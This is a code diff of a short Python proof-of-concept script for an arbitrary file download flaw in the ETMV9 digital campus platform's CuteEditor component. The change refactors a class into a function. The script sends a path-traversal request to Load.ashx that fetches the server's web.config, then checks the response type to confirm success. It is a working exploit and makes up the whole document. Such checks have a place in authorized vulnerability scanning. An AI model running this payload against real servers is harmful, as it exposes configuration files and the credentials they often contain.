@@ -10,20 +10,13 @@ description: 该校园平台使用了第三方编辑器CuteEditor，虽然删除
 import sys
 import requests
 import warnings
-
-
-
-class Load_filedownload:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['ETMV9数字化校园平台任意下载', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/ETMDCP/CuteSoft_Client/CuteEditor/Load.ashx?type=image&file=../../../web.config"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
@@ -38,5 +31,4 @@ class Load_filedownload:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = Load_filedownload(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
